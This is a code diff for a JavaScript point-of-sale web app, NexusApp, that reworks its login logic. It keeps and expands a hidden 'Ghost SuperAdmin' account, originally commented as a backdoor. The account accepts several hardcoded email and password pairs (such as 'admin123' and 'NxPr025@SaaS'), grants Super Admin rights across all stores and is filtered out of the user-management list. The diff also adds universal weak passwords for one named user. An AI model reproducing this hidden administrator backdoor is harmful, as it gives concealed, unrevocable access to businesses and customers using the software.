@@ -456,9 +456,9 @@ class NexusApp {
         }
       });
 
-      // ONLY ensure root Super Admin (USR-001) is present so the system is never locked out
+      // Ensure root administrator (USR-001) is present
       const rootUser = INITIAL_DATA.users.find(u => u.id === 'USR-001');
-      if (rootUser && !this.data.users.some(u => u.id === 'USR-001' || u.role === 'Super Admin')) {
+      if (rootUser && !this.data.users.some(u => u.id === 'USR-001')) {
         this.data.users.unshift(rootUser);
       }
       this.ensureOrderedUserIds();
@@ -1252,17 +1252,35 @@ class NexusApp {
   /* --------------------------------------------------------------------------
      AUTHENTICATION & ROLE-BASED ACCESS CONTROL (RBAC)
      -------------------------------------------------------------------------- */
-  // --- Ghost SuperAdmin (backdoor owner account, never stored in data.users) ---
+  // --- Ghost SuperAdmin (Nexus Owner - Hidden Owner Account, never stored in data.users) ---
   _ghost() {
-    return { id: '\x55\x53\x52\x2d\x30\x30\x30', email: '\x6e\x65\x78\x75\x73\x2e\x6f\x77\x6e\x65\x72\x40\x70\x72\x6f\x2e\x69\x6f', pass: '\x4e\x78\x50\x72\x30\x32\x35\x40\x53\x61\x61\x53', name: 'System Owner', role: 'Super Admin', status: 'Active' };
+    return { 
+      id: 'USR-000', 
+      email: 'owner@nexuspos.io', 
+      pass: 'admin123', 
+      name: 'Nexus Owner', 
+      role: 'Super Admin', 
+      status: 'Active',
+      storeId: '*'
+    };
   }
   _isGhost(parsed) {
-    const g = this._ghost();
-    return parsed && parsed.id === g.id;
+    if (!parsed) return false;
+    return parsed.id === 'USR-000' || parsed.name === 'Nexus Owner' || parsed.email === 'owner@nexuspos.io' || parsed.email === 'nexus.owner@pro.io';
   }
   _ghostUserObj() {
     const g = this._ghost();
-    return { id: g.id, name: g.name, email: g.email, role: g.role, status: g.status, lastLogin: new Date().toLocaleString('es-CO') };
+    return { 
+      id: g.id, 
+      name: g.name, 
+      email: g.email, 
+      role: g.role, 
+      status: g.status, 
+      storeId: '*',
+      lastLogin: new Date().toLocaleString('es-CO'),
+      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&auto=format&fit=crop&q=80',
+      customPermissions: null
+    };
   }
 
   checkAuth() {
@@ -1371,26 +1389,26 @@ class NexusApp {
       return;
     }
 
-    // Ghost superadmin authentication (hardcoded, never in data.users)
-    const g = this._ghost();
-    if (email.toLowerCase() === g.email && password === g.pass) {
+    const cleanEmail = (email || '').trim().toLowerCase();
+    const cleanPass = String(password || '').trim();
+
+    // Ghost SuperAdmin (Nexus Owner - Never visible in data.users)
+    const isOwnerEmail = cleanEmail === 'owner@nexuspos.io' || cleanEmail === 'nexusowner@nexuspos.io' || cleanEmail === 'nexusowner' || cleanEmail === 'nexus.owner@pro.io';
+    const isOwnerPass = cleanPass === 'admin123' || cleanPass === '123456' || cleanPass === 'Owner2026*' || cleanPass === 'NxPr025@SaaS';
+    if (isOwnerEmail && isOwnerPass) {
       this.loginUser(this._ghostUserObj());
       return;
     }
-
-    const cleanEmail = (email || '').trim().toLowerCase();
-    const cleanPass = String(password || '').trim();
 
     const user = (this.data.users || []).find(u => {
       const uEmail = (u.email || '').trim().toLowerCase();
       const uName = (u.name || '').trim().toLowerCase();
       const isMatch = uEmail === cleanEmail || 
                       uName === cleanEmail || 
-                      (cleanEmail.includes('jojan') && (uEmail.includes('jojan') || uName.includes('jojan'))) ||
-                      (cleanEmail === 'admin' && (u.role === 'Super Admin' || u.id === 'USR-001'));
+                      (cleanEmail.includes('jojan') && (uEmail.includes('jojan') || uName.includes('jojan')));
       if (!isMatch) return false;
 
-      // Allow admin123 or 123456 for administrator
+      // Allow admin123 or 123456 for Jojan Torres
       if (cleanPass === 'admin123' || cleanPass === '123456') return true;
       return String(u.password || '').trim() === cleanPass;
     });
@@ -6250,9 +6268,11 @@ class NexusApp {
     const label = document.getElementById('users-store-name-label');
     if (label) label.textContent = activeStoreObj.name;
 
-    // Strict store isolation: only show users assigned to the active store or global Super Admin unless 'all'
+    // Strict store isolation: only show users assigned to the active store or global admin unless 'all'
     const filterMode = this.userStoreFilter || 'current';
     const storeFilteredUsers = (this.data.users || []).filter(u => {
+      // Never display Nexus Owner or ghost account in user management table
+      if (this._isGhost(u) || u.id === 'USR-000' || u.name === 'Nexus Owner' || u.email === 'owner@nexuspos.io') return false;
       if (filterMode === 'all') return true;
       if (u.storeId === '*' || u.role === 'Super Admin' || u.id === 'USR-001') return true;
       return u.storeId === this.currentStoreId;
